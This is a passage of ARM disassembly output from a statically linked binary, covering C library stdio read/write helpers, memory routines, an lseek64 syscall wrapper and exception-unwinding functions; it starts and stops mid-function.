   1d634:	e5c53012 	strb	r3, [r5, #18]
   1d638:	ebffe49c 	bl	168b0 <__GI_memcpy>
   1d63c:	e1d731b0 	ldrh	r3, [r7, #16]
   1d640:	e1a05006 	mov	r5, r6
   1d644:	e0877003 	add	r7, r7, r3
   1d648:	e51b3034 	ldr	r3, [fp, #-52]	; 0xffffffcc
   1d64c:	e1570003 	cmp	r7, r3
   1d650:	e2850013 	add	r0, r5, #19
   1d654:	e2871013 	add	r1, r7, #19
   1d658:	3affffd6 	bcc	1d5b8 <__getdents64+0x88>
   1d65c:	e06a1005 	rsb	r1, sl, r5
   1d660:	e1a00001 	mov	r0, r1
   1d664:	e24bd028 	sub	sp, fp, #40	; 0x28
   1d668:	e89d6ff0 	ldm	sp, {r4, r5, r6, r7, r8, r9, sl, fp, sp, lr}
   1d66c:	e12fff1e 	bx	lr
   1d670:	0000b468 	.word	0x0000b468
   1d674:	0000b3e4 	.word	0x0000b3e4

0001d678 <__stdio_READ>:
   1d678:	e92d4030 	push	{r4, r5, lr}
   1d67c:	e1d030b0 	ldrh	r3, [r0]
   1d680:	e2135004 	ands	r5, r3, #4
   1d684:	e1a04000 	mov	r4, r0
   1d688:	e24dd004 	sub	sp, sp, #4
   1d68c:	13a00000 	movne	r0, #0
   1d690:	1a00000b 	bne	1d6c4 <__stdio_READ+0x4c>
   1d694:	e3520000 	cmp	r2, #0
   1d698:	b3e02102 	mvnlt	r2, #-2147483648	; 0x80000000
   1d69c:	e5940004 	ldr	r0, [r4, #4]
   1d6a0:	ebfff252 	bl	19ff0 <__GI___libc_read>
   1d6a4:	e3500000 	cmp	r0, #0
   1d6a8:	ca000005 	bgt	1d6c4 <__stdio_READ+0x4c>
   1d6ac:	e1d430b0 	ldrh	r3, [r4]
   1d6b0:	03833004 	orreq	r3, r3, #4
   1d6b4:	13833008 	orrne	r3, r3, #8
   1d6b8:	01c430b0 	strheq	r3, [r4]
   1d6bc:	11c430b0 	strhne	r3, [r4]
   1d6c0:	11a00005 	movne	r0, r5
   1d6c4:	e28dd004 	add	sp, sp, #4
   1d6c8:	e8bd4030 	pop	{r4, r5, lr}
   1d6cc:	e12fff1e 	bx	lr

0001d6d0 <__stdio_WRITE>:
   1d6d0:	e92d41f0 	push	{r4, r5, r6, r7, r8, lr}
   1d6d4:	e1a07002 	mov	r7, r2
   1d6d8:	e1a04000 	mov	r4, r0
   1d6dc:	e1a06001 	mov	r6, r1
   1d6e0:	e1a05002 	mov	r5, r2
   1d6e4:	e3e08102 	mvn	r8, #-2147483648	; 0x80000000
   1d6e8:	ea000029 	b	1d794 <__stdio_WRITE+0xc4>
   1d6ec:	b1a02008 	movlt	r2, r8
   1d6f0:	a1a02005 	movge	r2, r5
   1d6f4:	e1a01006 	mov	r1, r6
   1d6f8:	e5940004 	ldr	r0, [r4, #4]
   1d6fc:	ebfff217 	bl	19f60 <__GI___libc_write>
   1d700:	e3500000 	cmp	r0, #0
   1d704:	a0866000 	addge	r6, r6, r0
   1d708:	a0605005 	rsbge	r5, r0, r5
   1d70c:	aa000020 	bge	1d794 <__stdio_WRITE+0xc4>
   1d710:	e1d430b0 	ldrh	r3, [r4]
   1d714:	e3833008 	orr	r3, r3, #8
   1d718:	e1c430b0 	strh	r3, [r4]
   1d71c:	e59f3084 	ldr	r3, [pc, #132]	; 1d7a8 <__stdio_WRITE+0xd8>
   1d720:	ebfff452 	bl	1a870 <__aeabi_read_tp>
   1d724:	e79f3003 	ldr	r3, [pc, r3]
   1d728:	e7903003 	ldr	r3, [r0, r3]
   1d72c:	e3530004 	cmp	r3, #4
   1d730:	1353000b 	cmpne	r3, #11
   1d734:	1a000018 	bne	1d79c <__stdio_WRITE+0xcc>
   1d738:	e2842008 	add	r2, r4, #8
   1d73c:	e892000c 	ldm	r2, {r2, r3}
   1d740:	e0531002 	subs	r1, r3, r2
   1d744:	0a000010 	beq	1d78c <__stdio_WRITE+0xbc>
   1d748:	e1510005 	cmp	r1, r5
   1d74c:	21a01005 	movcs	r1, r5
   1d750:	e5d63000 	ldrb	r3, [r6]
   1d754:	e353000a 	cmp	r3, #10
   1d758:	e2866001 	add	r6, r6, #1
   1d75c:	e5c23000 	strb	r3, [r2]
   1d760:	1a000002 	bne	1d770 <__stdio_WRITE+0xa0>
   1d764:	e1d430b0 	ldrh	r3, [r4]
   1d768:	e3130c01 	tst	r3, #256	; 0x100
   1d76c:	1a000002 	bne	1d77c <__stdio_WRITE+0xac>
   1d770:	e2511001 	subs	r1, r1, #1
   1d774:	e2822001 	add	r2, r2, #1
   1d778:	1afffff4 	bne	1d750 <__stdio_WRITE+0x80>
   1d77c:	e5943008 	ldr	r3, [r4, #8]
   1d780:	e5842010 	str	r2, [r4, #16]
   1d784:	e0633002 	rsb	r3, r3, r2
   1d788:	e0635005 	rsb	r5, r3, r5
   1d78c:	e0657007 	rsb	r7, r5, r7
   1d790:	ea000001 	b	1d79c <__stdio_WRITE+0xcc>
   1d794:	e3550000 	cmp	r5, #0
   1d798:	1affffd3 	bne	1d6ec <__stdio_WRITE+0x1c>
   1d79c:	e1a00007 	mov	r0, r7
   1d7a0:	e8bd41f0 	pop	{r4, r5, r6, r7, r8, lr}
   1d7a4:	e12fff1e 	bx	lr
   1d7a8:	0000b2c0 	.word	0x0000b2c0

0001d7ac <__stdio_rfill>:
   1d7ac:	e92d4010 	push	{r4, lr}
   1d7b0:	e2801008 	add	r1, r0, #8
   1d7b4:	e8910006 	ldm	r1, {r1, r2}
   1d7b8:	e0612002 	rsb	r2, r1, r2
   1d7bc:	e1a04000 	mov	r4, r0
   1d7c0:	ebffffac 	bl	1d678 <__stdio_READ>
   1d7c4:	e5942008 	ldr	r2, [r4, #8]
   1d7c8:	e0823000 	add	r3, r2, r0
   1d7cc:	e5843014 	str	r3, [r4, #20]
   1d7d0:	e5842010 	str	r2, [r4, #16]
   1d7d4:	e8bd4010 	pop	{r4, lr}
   1d7d8:	e12fff1e 	bx	lr

0001d7dc <__stdio_trans2r_o>:
   1d7dc:	e92d4030 	push	{r4, r5, lr}
   1d7e0:	e1d030b0 	ldrh	r3, [r0]
   1d7e4:	e1110003 	tst	r1, r3
   1d7e8:	e24dd004 	sub	sp, sp, #4
   1d7ec:	e1a04000 	mov	r4, r0
   1d7f0:	1a000003 	bne	1d804 <__stdio_trans2r_o+0x28>
   1d7f4:	e3130d22 	tst	r3, #2176	; 0x880
   1d7f8:	1a000004 	bne	1d810 <__stdio_trans2r_o+0x34>
   1d7fc:	e1813003 	orr	r3, r1, r3
   1d800:	e1c030b0 	strh	r3, [r0]
   1d804:	e1d430b0 	ldrh	r3, [r4]
   1d808:	e2135010 	ands	r5, r3, #16
   1d80c:	0a000009 	beq	1d838 <__stdio_trans2r_o+0x5c>
   1d810:	e59f3064 	ldr	r3, [pc, #100]	; 1d87c <__stdio_trans2r_o+0xa0>
   1d814:	ebfff415 	bl	1a870 <__aeabi_read_tp>
   1d818:	e79f3003 	ldr	r3, [pc, r3]
   1d81c:	e3a02009 	mov	r2, #9
   1d820:	e7802003 	str	r2, [r0, r3]
   1d824:	e1d430b0 	ldrh	r3, [r4]
   1d828:	e3e00000 	mvn	r0, #0
   1d82c:	e3833008 	orr	r3, r3, #8
   1d830:	e1c430b0 	strh	r3, [r4]
   1d834:	ea00000d 	b	1d870 <__stdio_trans2r_o+0x94>
   1d838:	e3130040 	tst	r3, #64	; 0x40
   1d83c:	0a000007 	beq	1d860 <__stdio_trans2r_o+0x84>
   1d840:	ebfff910 	bl	1bc88 <__stdio_wcommit>
   1d844:	e3500000 	cmp	r0, #0
   1d848:	1afffff5 	bne	1d824 <__stdio_trans2r_o+0x48>
   1d84c:	e1d430b0 	ldrh	r3, [r4]
   1d850:	e5942008 	ldr	r2, [r4, #8]
   1d854:	e3c33040 	bic	r3, r3, #64	; 0x40
   1d858:	e584201c 	str	r2, [r4, #28]
   1d85c:	e1c430b0 	strh	r3, [r4]
   1d860:	e1d430b0 	ldrh	r3, [r4]
   1d864:	e3833001 	orr	r3, r3, #1
   1d868:	e1c430b0 	strh	r3, [r4]
   1d86c:	e1a00005 	mov	r0, r5
   1d870:	e28dd004 	add	sp, sp, #4
   1d874:	e8bd4030 	pop	{r4, r5, lr}
   1d878:	e12fff1e 	bx	lr
   1d87c:	0000b1cc 	.word	0x0000b1cc

0001d880 <__GI_mempcpy>:
   1d880:	e92d4030 	push	{r4, r5, lr}
   1d884:	e24dd004 	sub	sp, sp, #4
   1d888:	e1a05000 	mov	r5, r0
   1d88c:	e1a04002 	mov	r4, r2
   1d890:	ebffe406 	bl	168b0 <__GI_memcpy>
   1d894:	e0850004 	add	r0, r5, r4
   1d898:	e28dd004 	add	sp, sp, #4
   1d89c:	e8bd4030 	pop	{r4, r5, lr}
   1d8a0:	e12fff1e 	bx	lr

0001d8a4 <__GI_rawmemchr>:
   1d8a4:	e92d4010 	push	{r4, lr}
   1d8a8:	e201e0ff 	and	lr, r1, #255	; 0xff
   1d8ac:	ea000003 	b	1d8c0 <__GI_rawmemchr+0x1c>
   1d8b0:	e5d03000 	ldrb	r3, [r0]
   1d8b4:	e153000e 	cmp	r3, lr
   1d8b8:	0a000021 	beq	1d944 <__GI_rawmemchr+0xa0>
   1d8bc:	e2800001 	add	r0, r0, #1
   1d8c0:	e3100003 	tst	r0, #3
   1d8c4:	1afffff9 	bne	1d8b0 <__GI_rawmemchr+0xc>
   1d8c8:	e18e340e 	orr	r3, lr, lr, lsl #8
   1d8cc:	e1a0c000 	mov	ip, r0
   1d8d0:	e1834803 	orr	r4, r3, r3, lsl #16
   1d8d4:	e49c3004 	ldr	r3, [ip], #4
   1d8d8:	e59f106c 	ldr	r1, [pc, #108]	; 1d94c <__GI_rawmemchr+0xa8>
   1d8dc:	e0243003 	eor	r3, r4, r3
   1d8e0:	e0831001 	add	r1, r3, r1
   1d8e4:	e59f2064 	ldr	r2, [pc, #100]	; 1d950 <__GI_rawmemchr+0xac>
   1d8e8:	e1e03003 	mvn	r3, r3
   1d8ec:	e0233001 	eor	r3, r3, r1
   1d8f0:	e0032002 	and	r2, r3, r2
   1d8f4:	e3520000 	cmp	r2, #0
   1d8f8:	0afffff5 	beq	1d8d4 <__GI_rawmemchr+0x30>
   1d8fc:	e55c3004 	ldrb	r3, [ip, #-4]
   1d900:	e24c0004 	sub	r0, ip, #4
   1d904:	e153000e 	cmp	r3, lr
   1d908:	e2802003 	add	r2, r0, #3
   1d90c:	0a00000c 	beq	1d944 <__GI_rawmemchr+0xa0>
   1d910:	e55c3003 	ldrb	r3, [ip, #-3]
   1d914:	e153000e 	cmp	r3, lr
   1d918:	e2803001 	add	r3, r0, #1
   1d91c:	01a00003 	moveq	r0, r3
   1d920:	0a000007 	beq	1d944 <__GI_rawmemchr+0xa0>
   1d924:	e55c3002 	ldrb	r3, [ip, #-2]
   1d928:	e153000e 	cmp	r3, lr
   1d92c:	e2800002 	add	r0, r0, #2
   1d930:	0a000003 	beq	1d944 <__GI_rawmemchr+0xa0>
   1d934:	e55c3001 	ldrb	r3, [ip, #-1]
   1d938:	e153000e 	cmp	r3, lr
   1d93c:	1affffe4 	bne	1d8d4 <__GI_rawmemchr+0x30>
   1d940:	e1a00002 	mov	r0, r2
   1d944:	e8bd4010 	pop	{r4, lr}
   1d948:	e12fff1e 	bx	lr
   1d94c:	7efefeff 	.word	0x7efefeff
   1d950:	81010100 	.word	0x81010100

0001d954 <__sigjmp_save>:
   1d954:	e3510000 	cmp	r1, #0
   1d958:	e92d4010 	push	{r4, lr}
   1d95c:	e1a04000 	mov	r4, r0
   1d960:	0a000006 	beq	1d980 <__sigjmp_save+0x2c>
   1d964:	e3a00000 	mov	r0, #0
   1d968:	e1a01000 	mov	r1, r0
   1d96c:	e2842f41 	add	r2, r4, #260	; 0x104
   1d970:	ebffe27a 	bl	16360 <__GI_sigprocmask>
   1d974:	e3500000 	cmp	r0, #0
   1d978:	03a03001 	moveq	r3, #1
   1d97c:	0a000000 	beq	1d984 <__sigjmp_save+0x30>
   1d980:	e3a03000 	mov	r3, #0
   1d984:	e3a00000 	mov	r0, #0
   1d988:	e5843100 	str	r3, [r4, #256]	; 0x100
   1d98c:	e8bd4010 	pop	{r4, lr}
   1d990:	e12fff1e 	bx	lr

0001d994 <__GI_lseek64>:
   1d994:	e92d4090 	push	{r4, r7, lr}
   1d998:	e1a04003 	mov	r4, r3
   1d99c:	e24dd00c 	sub	sp, sp, #12
   1d9a0:	e1a01004 	mov	r1, r4
   1d9a4:	e1a0300d 	mov	r3, sp
   1d9a8:	e59d4018 	ldr	r4, [sp, #24]
   1d9ac:	e3a0708c 	mov	r7, #140	; 0x8c
   1d9b0:	ef000000 	svc	0x00000000
   1d9b4:	e3700a01 	cmn	r0, #4096	; 0x1000
   1d9b8:	e1a02000 	mov	r2, r0
   1d9bc:	9a000006 	bls	1d9dc <__GI_lseek64+0x48>
   1d9c0:	e59f3038 	ldr	r3, [pc, #56]	; 1da00 <__GI_lseek64+0x6c>
   1d9c4:	ebfff3a9 	bl	1a870 <__aeabi_read_tp>
   1d9c8:	e79f3003 	ldr	r3, [pc, r3]
   1d9cc:	e2622000 	rsb	r2, r2, #0
   1d9d0:	e3e01000 	mvn	r1, #0
   1d9d4:	e7802003 	str	r2, [r0, r3]
   1d9d8:	ea000001 	b	1d9e4 <__GI_lseek64+0x50>
   1d9dc:	e2501000 	subs	r1, r0, #0
   1d9e0:	0a000002 	beq	1d9f0 <__GI_lseek64+0x5c>
   1d9e4:	e1a00001 	mov	r0, r1
   1d9e8:	e1a01fc0 	asr	r1, r0, #31
   1d9ec:	ea000000 	b	1d9f4 <__GI_lseek64+0x60>
   1d9f0:	e89d0003 	ldm	sp, {r0, r1}
   1d9f4:	e28dd00c 	add	sp, sp, #12
   1d9f8:	e8bd4090 	pop	{r4, r7, lr}
   1d9fc:	e12fff1e 	bx	lr
   1da00:	0000b01c 	.word	0x0000b01c

0001da04 <_Unwind_VRS_Get>:
   1da04:	e3510000 	cmp	r1, #0
   1da08:	1a00000b 	bne	1da3c <_Unwind_VRS_Get+0x38>
   1da0c:	e352000f 	cmp	r2, #15
   1da10:	93530000 	cmpls	r3, #0
   1da14:	03a01000 	moveq	r1, #0
   1da18:	13a01001 	movne	r1, #1
   1da1c:	1a000009 	bne	1da48 <_Unwind_VRS_Get+0x44>
   1da20:	e1a03102 	lsl	r3, r2, #2
   1da24:	e0833000 	add	r3, r3, r0
   1da28:	e5932004 	ldr	r2, [r3, #4]
   1da2c:	e59d3000 	ldr	r3, [sp]
   1da30:	e1a00001 	mov	r0, r1
   1da34:	e5832000 	str	r2, [r3]
   1da38:	e12fff1e 	bx	lr
   1da3c:	e3510004 	cmp	r1, #4
   1da40:	93a00001 	movls	r0, #1
   1da44:	912fff1e 	bxls	lr
   1da48:	e3a00002 	mov	r0, #2
   1da4c:	e12fff1e 	bx	lr

0001da50 <_Unwind_VRS_Set>:
   1da50:	e3510000 	cmp	r1, #0
   1da54:	1a00000b 	bne	1da88 <_Unwind_VRS_Set+0x38>
   1da58:	e352000f 	cmp	r2, #15
   1da5c:	93530000 	cmpls	r3, #0
   1da60:	03a01000 	moveq	r1, #0
   1da64:	13a01001 	movne	r1, #1
   1da68:	1a000009 	bne	1da94 <_Unwind_VRS_Set+0x44>
   1da6c:	e59dc000 	ldr	ip, [sp]
   1da70:	e1a03102 	lsl	r3, r2, #2
   1da74:	e59c2000 	ldr	r2, [ip]
   1da78:	e0833000 	add	r3, r3, r0
   1da7c:	e1a00001 	mov	r0, r1
   1da80:	e5832004 	str	r2, [r3, #4]
   1da84:	e12fff1e 	bx	lr
   1da88:	e3510004 	cmp	r1, #4
   1da8c:	93a00001 	movls	r0, #1
   1da90:	912fff1e 	bxls	lr
   1da94:	e3a00002 	mov	r0, #2
   1da98:	e12fff1e 	bx	lr

0001da9c <_Unwind_GetCFA>:
   1da9c:	e5900044 	ldr	r0, [r0, #68]	; 0x44
   1daa0:	e12fff1e 	bx	lr

0001daa4 <_Unwind_Complete>:
   1daa4:	e12fff1e 	bx	lr

0001daa8 <_Unwind_DeleteException>:
   1daa8:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1daac:	e5903008 	ldr	r3, [r0, #8]
   1dab0:	e3530000 	cmp	r3, #0
   1dab4:	e24dd004 	sub	sp, sp, #4
   1dab8:	11a01000 	movne	r1, r0
   1dabc:	13a00001 	movne	r0, #1
   1dac0:	11a0e00f 	movne	lr, pc
   1dac4:	112fff13 	bxne	r3
   1dac8:	e28dd004 	add	sp, sp, #4
   1dacc:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   1dad0:	e12fff1e 	bx	lr

0001dad4 <_Unwind_GetTextRelBase>:
   1dad4:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1dad8:	e24dd004 	sub	sp, sp, #4
   1dadc:	ebffeab6 	bl	185bc <__GI_abort>

0001dae0 <_Unwind_GetDataRelBase>:
   1dae0:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1dae4:	e24dd004 	sub	sp, sp, #4
   1dae8:	ebffeab3 	bl	185bc <__GI_abort>

0001daec <get_eit_entry>:
   1daec:	e92d47f0 	push	{r4, r5, r6, r7, r8, r9, sl, lr}
   1daf0:	e59f51f8 	ldr	r5, [pc, #504]	; 1dcf0 <get_eit_entry+0x204>
   1daf4:	e59f31f8 	ldr	r3, [pc, #504]	; 1dcf4 <get_eit_entry+0x208>
   1daf8:	e08f5005 	add	r5, pc, r5
   1dafc:	e7953003 	ldr	r3, [r5, r3]
   1db00:	e3530000 	cmp	r3, #0
   1db04:	e24dd008 	sub	sp, sp, #8
   1db08:	e1a06000 	mov	r6, r0
   1db0c:	e2414002 	sub	r4, r1, #2
   1db10:	0a00000b 	beq	1db44 <get_eit_entry+0x58>
   1db14:	e1a00004 	mov	r0, r4
   1db18:	e28d1004 	add	r1, sp, #4
   1db1c:	e1a0e00f 	mov	lr, pc
   1db20:	e12fff13 	bx	r3
   1db24:	e3500000 	cmp	r0, #0
   1db28:	03a02009 	moveq	r2, #9
   1db2c:	05860010 	streq	r0, [r6, #16]
   1db30:	1a00000b 	bne	1db64 <get_eit_entry+0x78>
   1db34:	e1a00002 	mov	r0, r2
   1db38:	e28dd008 	add	sp, sp, #8
   1db3c:	e8bd47f0 	pop	{r4, r5, r6, r7, r8, r9, sl, lr}
   1db40:	e12fff1e 	bx	lr
   1db44:	e59f21ac 	ldr	r2, [pc, #428]	; 1dcf8 <get_eit_entry+0x20c>
   1db48:	e59f11ac 	ldr	r1, [pc, #428]	; 1dcfc <get_eit_entry+0x210>
   1db4c:	e7953002 	ldr	r3, [r5, r2]
   1db50:	e7952001 	ldr	r2, [r5, r1]
   1db54:	e0623003 	rsb	r3, r2, r3
   1db58:	e1a031c3 	asr	r3, r3, #3
   1db5c:	e58d3004 	str	r3, [sp, #4]
   1db60:	e1a00002 	mov	r0, r2
   1db64:	e59d3004 	ldr	r3, [sp, #4]
   1db68:	e3530000 	cmp	r3, #0
   1db6c:	12438001 	subne	r8, r3, #1
   1db70:	11a09008 	movne	r9, r8
   1db74:	13a0a000 	movne	sl, #0
   1db78:	1a000006 	bne	1db98 <get_eit_entry+0xac>
   1db7c:	e3a03000 	mov	r3, #0
   1db80:	e3a02009 	mov	r2, #9
   1db84:	e5863010 	str	r3, [r6, #16]
   1db88:	eaffffe9 	b	1db34 <get_eit_entry+0x48>
   1db8c:	e1510004 	cmp	r1, r4
   1db90:	2a00001b 	bcs	1dc04 <get_eit_entry+0x118>
   1db94:	e28ea001 	add	sl, lr, #1
   1db98:	e088300a 	add	r3, r8, sl
   1db9c:	e0833fa3 	add	r3, r3, r3, lsr #31
   1dba0:	e1a0e0c3 	asr	lr, r3, #1
   1dba4:	e1a0c18e 	lsl	ip, lr, #3
   1dba8:	e790300c 	ldr	r3, [r0, ip]
   1dbac:	e3130101 	tst	r3, #1073741824	; 0x40000000
   1dbb0:	13832102 	orrne	r2, r3, #-2147483648	; 0x80000000
   1dbb4:	03c32102 	biceq	r2, r3, #-2147483648	; 0x80000000
   1dbb8:	e159000e 	cmp	r9, lr
   1dbbc:	e080700c 	add	r7, r0, ip
   1dbc0:	03e01000 	mvneq	r1, #0
   1dbc4:	0a000007 	beq	1dbe8 <get_eit_entry+0xfc>
   1dbc8:	e2803008 	add	r3, r0, #8
   1dbcc:	e79c1003 	ldr	r1, [ip, r3]
   1dbd0:	e08c3003 	add	r3, ip, r3
   1dbd4:	e3110101 	tst	r1, #1073741824	; 0x40000000
   1dbd8:	13811102 	orrne	r1, r1, #-2147483648	; 0x80000000
   1dbdc:	03c11102 	biceq	r1, r1, #-2147483648	; 0x80000000
   1dbe0:	e2433001 	sub	r3, r3, #1
   1dbe4:	e0831001 	add	r1, r3, r1
   1dbe8:	e0823007 	add	r3, r2, r7
   1dbec:	e1540003 	cmp	r4, r3
   1dbf0:	2affffe5 	bcs	1db8c <get_eit_entry+0xa0>
   1dbf4:	e15e000a 	cmp	lr, sl
   1dbf8:	0affffdf 	beq	1db7c <get_eit_entry+0x90>
   1dbfc:	e24e8001 	sub	r8, lr, #1
   1dc00:	eaffffe4 	b	1db98 <get_eit_entry+0xac>
   1dc04:	e5973000 	ldr	r3, [r7]
   1dc08:	e3130101 	tst	r3, #1073741824	; 0x40000000
   1dc0c:	13833102 	orrne	r3, r3, #-2147483648	; 0x80000000
   1dc10:	03c33102 	biceq	r3, r3, #-2147483648	; 0x80000000
   1dc14:	e0833007 	add	r3, r3, r7
   1dc18:	e5863048 	str	r3, [r6, #72]	; 0x48
   1dc1c:	e5973004 	ldr	r3, [r7, #4]
   1dc20:	e3530001 	cmp	r3, #1
   1dc24:	02433001 	subeq	r3, r3, #1
   1dc28:	03a02005 	moveq	r2, #5
   1dc2c:	05863010 	streq	r3, [r6, #16]
   1dc30:	0affffbf 	beq	1db34 <get_eit_entry+0x48>
   1dc34:	e3530000 	cmp	r3, #0
   1dc38:	b2873004 	addlt	r3, r7, #4
   1dc3c:	b3a02001 	movlt	r2, #1
   1dc40:	b586304c 	strlt	r3, [r6, #76]	; 0x4c
   1dc44:	b5862050 	strlt	r2, [r6, #80]	; 0x50
   1dc48:	ba000007 	blt	1dc6c <get_eit_entry+0x180>
   1dc4c:	e3130101 	tst	r3, #1073741824	; 0x40000000
   1dc50:	13832102 	orrne	r2, r3, #-2147483648	; 0x80000000
   1dc54:	03c32102 	biceq	r2, r3, #-2147483648	; 0x80000000
   1dc58:	e2873004 	add	r3, r7, #4
   1dc5c:	e0823003 	add	r3, r2, r3
   1dc60:	e3a02000 	mov	r2, #0
   1dc64:	e586304c 	str	r3, [r6, #76]	; 0x4c
   1dc68:	e5862050 	str	r2, [r6, #80]	; 0x50
   1dc6c:	e596204c 	ldr	r2, [r6, #76]	; 0x4c
   1dc70:	e5923000 	ldr	r3, [r2]
   1dc74:	e3530000 	cmp	r3, #0
   1dc78:	ba000006 	blt	1dc98 <get_eit_entry+0x1ac>
   1dc7c:	e3130101 	tst	r3, #1073741824	; 0x40000000
   1dc80:	13833102 	orrne	r3, r3, #-2147483648	; 0x80000000
   1dc84:	03c33102 	biceq	r3, r3, #-2147483648	; 0x80000000
   1dc88:	e0833002 	add	r3, r3, r2
   1dc8c:	e3a02000 	mov	r2, #0
   1dc90:	e5863010 	str	r3, [r6, #16]
   1dc94:	eaffffa6 	b	1db34 <get_eit_entry+0x48>
   1dc98:	e1a03c23 	lsr	r3, r3, #24
   1dc9c:	e213000f 	ands	r0, r3, #15
   1dca0:	1a000004 	bne	1dcb8 <get_eit_entry+0x1cc>
   1dca4:	e59f3054 	ldr	r3, [pc, #84]	; 1dd00 <get_eit_entry+0x214>
   1dca8:	e1a02000 	mov	r2, r0
   1dcac:	e0853003 	add	r3, r5, r3
   1dcb0:	e5863010 	str	r3, [r6, #16]
   1dcb4:	eaffff9e 	b	1db34 <get_eit_entry+0x48>
   1dcb8:	e3500001 	cmp	r0, #1
   1dcbc:	0a000006 	beq	1dcdc <get_eit_entry+0x1f0>
   1dcc0:	e3500002 	cmp	r0, #2
   1dcc4:	1affffac 	bne	1db7c <get_eit_entry+0x90>
   1dcc8:	e59f3034 	ldr	r3, [pc, #52]	; 1dd04 <get_eit_entry+0x218>
   1dccc:	e3a02000 	mov	r2, #0
   1dcd0:	e0853003 	add	r3, r5, r3
   1dcd4:	e5863010 	str	r3, [r6, #16]
   1dcd8:	eaffff95 	b	1db34 <get_eit_entry+0x48>
   1dcdc:	e59f3024 	ldr	r3, [pc, #36]	; 1dd08 <get_eit_entry+0x21c>
   1dce0:	e3a02000 	mov	r2, #0
   1dce4:	e0853003 	add	r3, r5, r3
   1dce8:	e5863010 	str	r3, [r6, #16]
   1dcec:	eaffff90 	b	1db34 <get_eit_entry+0x48>
   1dcf0:	0000ae94 	.word	0x0000ae94
   1dcf4:	00000084 	.word	0x00000084
   1dcf8:	00000014 	.word	0x00000014
   1dcfc:	00000030 	.word	0x00000030
   1dd00:	ffff5d24 	.word	0xffff5d24
   1dd04:	ffff5d14 	.word	0xffff5d14
   1dd08:	ffff5d1c 	.word	0xffff5d1c

0001dd0c <unwind_phase2_forced>:
   1dd0c:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1dd10:	e281c004 	add	ip, r1, #4
   1dd14:	e24ddf9b 	sub	sp, sp, #620	; 0x26c
   1dd18:	e1a05000 	mov	r5, r0
   1dd1c:	e1a06002 	mov	r6, r2
   1dd20:	e28d8f4f 	add	r8, sp, #316	; 0x13c
   1dd24:	e8bc000f 	ldm	ip!, {r0, r1, r2, r3}
   1dd28:	e1a0e008 	mov	lr, r8
   1dd2c:	e8ae000f 	stmia	lr!, {r0, r1, r2, r3}
   1dd30:	e8bc000f 	ldm	ip!, {r0, r1, r2, r3}
   1dd34:	e8ae000f 	stmia	lr!, {r0, r1, r2, r3}
   1dd38:	e8bc000f 	ldm	ip!, {r0, r1, r2, r3}
   1dd3c:	e8ae000f 	stmia	lr!, {r0, r1, r2, r3}
   1dd40:	e89c000f 	ldm	ip, {r0, r1, r2, r3}
   1dd44:	e3a04000 	mov	r4, #0
   1dd48:	e595900c 	ldr	r9, [r5, #12]
   1dd4c:	e595a018 	ldr	sl, [r5, #24]
   1dd50:	e88e000f 	stm	lr, {r0, r1, r2, r3}
   1dd54:	e1a00005 	mov	r0, r5
   1dd58:	e59d1178 	ldr	r1, [sp, #376]	; 0x178
   1dd5c:	e58d4138 	str	r4, [sp, #312]	; 0x138
   1dd60:	ebffff61 	bl	1daec <get_eit_entry>
   1dd64:	e1560004 	cmp	r6, r4
   1dd68:	e1a07000 	mov	r7, r0
   1dd6c:	128dbf4e 	addne	fp, sp, #312	; 0x138
   1dd70:	13a0600a 	movne	r6, #10
   1dd74:	1a000002 	bne	1dd84 <unwind_phase2_forced+0x78>
   1dd78:	e1a04006 	mov	r4, r6
   1dd7c:	e28dbf4e 	add	fp, sp, #312	; 0x138
   1dd80:	e3a06009 	mov	r6, #9
   1dd84:	e3570000 	cmp	r7, #0
   1dd88:	159d3170 	ldrne	r3, [sp, #368]	; 0x170
   1dd8c:	13866010 	orrne	r6, r6, #16
   1dd90:	158d317c 	strne	r3, [sp, #380]	; 0x17c
   1dd94:	0a000018 	beq	1ddfc <unwind_phase2_forced+0xf0>
   1dd98:	e58db000 	str	fp, [sp]
   1dd9c:	e58da004 	str	sl, [sp, #4]
   1dda0:	e1a01006 	mov	r1, r6
   1dda4:	e3a00001 	mov	r0, #1
   1dda8:	e1a02005 	mov	r2, r5
   1ddac:	e1a03005 	mov	r3, r5
   1ddb0:	e1a0e00f 	mov	lr, pc
   1ddb4:	e12fff19 	bx	r9
   1ddb8:	e3500000 	cmp	r0, #0
   1ddbc:	1a000009 	bne	1dde8 <unwind_phase2_forced+0xdc>
   1ddc0:	e3570000 	cmp	r7, #0
   1ddc4:	1a000008 	bne	1ddec <unwind_phase2_forced+0xe0>
   1ddc8:	e1a0000b 	mov	r0, fp
   1ddcc:	e28d1008 	add	r1, sp, #8
   1ddd0:	e3a02e13 	mov	r2, #304	; 0x130
   1ddd4:	ebffe2b5 	bl	168b0 <__GI_memcpy>
   1ddd8:	e3540008 	cmp	r4, #8
   1dddc:	0a000019 	beq	1de48 <unwind_phase2_forced+0x13c>
   1dde0:	e3540007 	cmp	r4, #7
   1dde4:	0a000015 	beq	1de40 <unwind_phase2_forced+0x134>
   1dde8:	e3a07009 	mov	r7, #9
   1ddec:	e1a00007 	mov	r0, r7
   1ddf0:	e28ddf9b 	add	sp, sp, #620	; 0x26c
   1ddf4:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1ddf8:	e12fff1e 	bx	lr
   1ddfc:	e59d3178 	ldr	r3, [sp, #376]	; 0x178
   1de00:	e28d4008 	add	r4, sp, #8
   1de04:	e5853014 	str	r3, [r5, #20]
   1de08:	e1a00004 	mov	r0, r4
   1de0c:	e1a0100b 	mov	r1, fp
   1de10:	e3a02e13 	mov	r2, #304	; 0x130
   1de14:	ebffe2a5 	bl	168b0 <__GI_memcpy>
   1de18:	e1a02004 	mov	r2, r4
   1de1c:	e1a00006 	mov	r0, r6
   1de20:	e1a01005 	mov	r1, r5
   1de24:	e595c010 	ldr	ip, [r5, #16]
   1de28:	e1a0e00f 	mov	lr, pc
   1de2c:	e12fff1c 	bx	ip
   1de30:	e59d3040 	ldr	r3, [sp, #64]	; 0x40
   1de34:	e1a04000 	mov	r4, r0
   1de38:	e58d317c 	str	r3, [sp, #380]	; 0x17c
   1de3c:	eaffffd5 	b	1dd98 <unwind_phase2_forced+0x8c>
   1de40:	e1a00008 	mov	r0, r8
